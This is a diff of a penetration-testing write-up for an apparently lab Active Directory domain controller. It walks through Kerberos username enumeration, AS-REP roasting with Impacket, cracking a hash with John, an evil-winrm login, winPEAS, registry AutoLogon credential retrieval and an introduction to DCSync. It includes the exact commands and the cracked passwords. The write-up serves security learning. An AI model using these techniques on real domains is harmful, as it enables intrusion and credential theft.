@@ -39,12 +39,7 @@ PORT      STATE SERVICE       REASON          VERSION
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
-49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
-49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
-58494/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+<SNIP>
 ```
 
 From the scan results, we know that this is probably an Active Directory Domain Controller.
@@ -85,7 +80,7 @@ Browsing through the website and ignoring the Loren Ipsum text, we notice:
 
 If you're new to Keberos, this is an [excellent introduction](https://www.roguelynn.com/words/explain-like-im-5-kerberos/).
 
-## Generating Username List
+### Generating Username List
 
 Username Anarchy is a [nifty tool](https://github.com/urbanadventurer/username-anarchy) you can use to generate a username list.
 
@@ -108,14 +103,14 @@ PORT   STATE SERVICE
 |_    fsmith@EGOTISTICAL-BANK.LOCAL
 ```
 
-* username:fsmith
+We have the following Kerberos usernames:
+
+* fsmith
+* hsmith
 
 ## AS-REP Roasting
 
-Conditions:
-
-* Have valid username
-* Pre-Authentication for user is disabled
+AS-REP roasting is the process of getting the Authentication Server to reply with information that we can crack for credentials.
 
 How it works:
 
@@ -125,9 +120,14 @@ How it works:
 3. In particular, logon session key is encrypted with a key derived from the **user's password**.
 4. With the encrypted logon session key, we can crack for the user's password offline.
 
+Conditions:
+
+* Have valid username
+* Pre-Authentication for user is disabled
+
 ### Requesting For Encrypted Ticket From AS
 
-From Linux, Impacket is the go-to tool for pentesting Kerberos.
+For Linux, [Impacket](https://github.com/SecureAuthCorp/impacket) is the go-to tool for pentesting Kerberos.
 
 `./GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile TargetUsers.txt -format john -outputfile hashes.asreproast`
 
@@ -141,9 +141,9 @@ User hsmith requires Pre-Authentication so we cannot get the TGT and the encrypt
 
 But we are able to obtain the information for fsmith.
 
-The nmap script above and GetNPUsers use the same mechanism, so technically you can skip the separate user enumeration.
+(The nmap script above and GetNPUsers use the same mechanism, so technically we could have skipped the separate user enumeration.)
 
-### Cracking Password
+### Cracking The Password
 
 Next, crack the password using John The Ripper.
 
@@ -157,7 +157,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
 ```
 
-We now have one set of credentials.
+We now have a set of credentials.
 
 * username: fsmith
 * password: Thestrokes23
@@ -192,28 +192,10 @@ Evil-winrm offers an easy way to get C# executables into a target machine. To so
 
 ```
 evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23 -e /folder/withbinary/
-*Evil-WinRM* PS C:\Users\FSmith\Documents> menu
-
-   ,.   (   .      )               "            ,.   (   .      )       .   
-  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
-.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
-_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
-\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
- |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
- |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
-/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
-        \/                               \/          \/       \/         \/
-              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers  
-
-[+] Bypass-4MSI
-[+] Dll-Loader
-[+] Donut-Loader
-[+] Invoke-Binary
-
 *Evil-WinRM* PS C:\Users\FSmith\Documents> Invoke-Binary /folder/withbinary/winPEAS.exe
 ```
 
-It returns a long output, but the red highlight makes it easy to spot the following.
+It returns a long output, but the default highlighting makes it easy to spot the following.
 
 ```
 [+] Looking for AutoLogon credentials(T1012)
@@ -223,7 +205,7 @@ It returns a long output, but the red highlight makes it easy to spot the follow
   DefaultPassword               :  Moneymakestheworldgoround!
   ```
 
-If you do not want to use winPEAS, you can also find it through a [manual enumeration process](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md).
+You can also find the autologon credentials through a [manual enumeration process](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md).
 
 * Autologon information is stored in the HKLM [registry hive](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives). A hive includes a logical group of keys, subkeys, and values.
 * To retrieve the information, we can use **reg** - [a console registry tool](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query).
@@ -240,7 +222,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
     DefaultPassword    REG_SZ    Moneymakestheworldgoround!
 ```
 
-## DCSync
+## DCSync Attack
 
 Many Active Directory (AD) infrastructure has multiple Domain Controllers. To maintain a consistent environment, you need a way to replicate AD objects for each DC. The replication is done through an API (DRSUAPI).
 
@@ -364,8 +346,6 @@ staffname format
 
 ad Permissions
 
-dcsync with impacket
-
 add to pentesting notes
 
 Kerberos and AS-REP Roasting
@@ -379,3 +359,8 @@ evil-winrm
 https://hacks.biz/evilwinrm-the-ultimate-winrm-shell-for-pentesting/
 
 https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/
+
+DCSync
+
+* https://github.com/backlion/Offensive-Security-OSCP-Cheatsheets/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync.md
+* https://pentestlab.blog/tag/dcsync/
